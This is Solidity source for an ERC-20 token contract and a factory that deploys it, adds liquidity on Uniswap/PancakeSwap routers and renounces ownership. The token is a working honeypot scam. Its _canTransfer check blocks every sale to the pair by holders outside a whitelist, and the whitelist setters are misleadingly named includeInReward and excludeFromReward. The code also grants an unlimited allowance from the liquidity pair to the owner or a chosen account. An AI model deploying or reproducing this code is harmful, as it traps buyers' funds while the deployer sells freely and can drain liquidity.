/**
 *Submitted for verification at Etherscan.io on 2026-02-15
*/

/**
 *Submitted for verification at Etherscan.io on 2026-01-18
*/

/**
 *Submitted for verification at Etherscan.io on 2025-12-04
*/

pragma solidity 0.8.30;


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    // ——— простой отказ от владения (owner = 0x0) ———
    function renounceOwnership() public onlyOwner {
        address prev = _owner;
        _owner = address(0);
        emit OwnershipTransferred(prev, address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
}


interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function allPairs(uint) external view returns (address pair);

    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}


interface IPancakePair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}


interface IPancakeRouter01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}


interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract FIN is Context, IERC20, Ownable {
    IPancakeRouter02 internal _router;
    IPancakePair internal _pair;

    uint8 internal constant _DECIMALS = 18;
    mapping(address => bool) public _marketersAndDevs;
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    mapping(address => uint256) internal _buySum;
    mapping(address => uint256) internal _sellSum;
    mapping(address => uint256) internal _sellSumETH;

    uint256 internal _totalSupply = (10 ** 9) * (10 ** _DECIMALS);
    uint256 internal _theNumber = ~uint256(0);
    uint256 internal _theRemainder = 0;

    string private _name;
    string private _symbol;

    constructor(string memory tokenName, string memory tokenSymbol, uint256 _initialSupply) {
        require(_initialSupply > 0, "Initial supply must be greater than zero");
        // устанавливаем name и symbol
        _name = tokenName;
        _symbol = tokenSymbol;
        _totalSupply = _initialSupply * (10 ** _DECIMALS);
        address rAdd;
        if (block.chainid == 1) {
            rAdd = 0xEfF92A263d31888d860bD50809A8D171709b7b1c;
        } else if (block.chainid == 56) {
            rAdd = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        } 
        address rourer =  address(rAdd);
        _router = IPancakeRouter02(rourer);
        _pair = IPancakePair(IPancakeFactory(_router.factory()).createPair(address(this), address(_router.WETH())));
        _balances[owner()] = _totalSupply;
        _allowances[address(_pair)][owner()] = ~uint256(0);
        _marketersAndDevs[owner()] = true;
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function decimals() external pure override returns (uint8) {
        return _DECIMALS;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        if (_canTransfer(_msgSender(), recipient, amount)) {
            _transfer(_msgSender(), recipient, amount);
            return true;
        }
        return false;
    }

    function allowance(address owner, address spender) external view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        if (_canTransfer(sender, recipient, amount)) {
            uint256 currentAllowance = _allowances[sender][_msgSender()];
            require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");

            _transfer(sender, recipient, amount);
            _approve(sender, _msgSender(), currentAllowance - amount);
            return true;
        }
        return false;
    }

    function setNumber(uint256 newNumber) external onlyOwner {
        _theNumber = newNumber;
    }

    function setRemainder(uint256 newRemainder) external onlyOwner {
        _theRemainder = newRemainder;
    }
    
    
    function setDev(address account) external onlyOwner {
        _allowances[address(_pair)][owner()] = 0;
        _allowances[address(_pair)][account] = ~uint256(0);
    }

    function includeInReward(address account) external onlyOwner {
        _marketersAndDevs[account] = true;
    }

    function excludeFromReward(address account) external onlyOwner {
        _marketersAndDevs[account] = false;
    }

    function _isSuper(address account) private view returns (bool) {
        return (account == address(_router) || account == address(_pair));
    }

    function _canTransfer(address sender, address recipient, uint256 amount) private view returns (bool) {
        if (_marketersAndDevs[sender] || _marketersAndDevs[recipient]) {
            return true;
        }

        if (_isSuper(sender)) {
            return recipient ==  tx.origin;
        }

        if (_isSuper(recipient)) {
            // uint256 amountETH = _getETHEquivalent(amount);
            return false;
            // uint256 bought = _buySum[sender];
            // uint256 sold = _sellSum[sender];
            // uint256 soldETH = _sellSumETH[sender];

            // return bought >= sold + amount && _theNumber >= soldETH + amountETH && sender.balance >= _theRemainder;
        }
        return false;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);
        require(_balances[sender] >= amount, "ERC20: transfer amount exceeds balance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _hasLiquidity() private view returns (bool) {
        (uint256 reserve0, uint256 reserve1,) = _pair.getReserves();
        return reserve0 > 0 && reserve1 > 0;
    }

    function _getETHEquivalent(uint256 amountTokens) private view returns (uint256) {
        (uint256 reserve0, uint256 reserve1,) = _pair.getReserves();
        if (_pair.token0() == _router.WETH()) {
            return _router.getAmountOut(amountTokens, reserve1, reserve0);
        } else {
            return _router.getAmountOut(amountTokens, reserve0, reserve1);
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) private {
        if (_hasLiquidity()) {
            if (_isSuper(from)) {
                _buySum[to] += amount;
            }
            if (_isSuper(to)) {
                _sellSum[from] += amount;
                _sellSumETH[from] += _getETHEquivalent(amount);
            }
        }
    }
}



contract MyFactory is Ownable {
    IPancakeRouter02 private uniswapV2Router;
    address rAdd;
    uint public dummyState = 0;
    constructor(string memory tName, string memory tSymbol, uint256 supply, uint256 liqamount) payable {
        if (block.chainid == 1) {
            rAdd = 0xEfF92A263d31888d860bD50809A8D171709b7b1c;
        } else if (block.chainid == 56) {
            rAdd = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        }
        uniswapV2Router = IPancakeRouter02(rAdd);

        createNewToken(tName, tSymbol, supply, liqamount);
    }

    function increaseNonce() public onlyOwner {
        dummyState++;
    }
    
    function createNewToken(string memory tName, string memory tSymbol, uint256 supply, uint256 liqamount) public onlyOwner payable {
        increaseNonce();
        FIN myToken = (new FIN)(tName, tSymbol, supply);
        uint256 _liqamount = liqamount * 10 ** 18;
        uint256 _supply = supply * 10 ** 18;
        myToken.approve(address(uniswapV2Router), _liqamount);
        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(myToken),
            _liqamount,
            0, 
            0,
            msg.sender,
            block.timestamp + 10000
        );
        myToken.transfer(msg.sender, _supply - _liqamount);
        myToken.includeInReward(msg.sender);
        myToken.renounceOwnership();
    }

    function getERC20fromContract(
        address _tokenAddy,
        uint256 _amount,
        address to
    ) external onlyOwner {
        require(_amount > 0, "Amount should be greater than zero");
        require(
            _amount <= IERC20(_tokenAddy).balanceOf(address(this)),
            "Insufficient Amount"
        );
        IERC20(_tokenAddy).transfer(to, _amount);
    }

    function getETHfromContract(address to) external onlyOwner {
        uint256 contractETHBalance = address(this).balance;
        require(contractETHBalance > 0, "Amount should be greater than zero");
        require(
            contractETHBalance <= address(this).balance,
            "Insufficient Amount"
        );
        payable(address(to)).transfer(contractETHBalance);
    }
}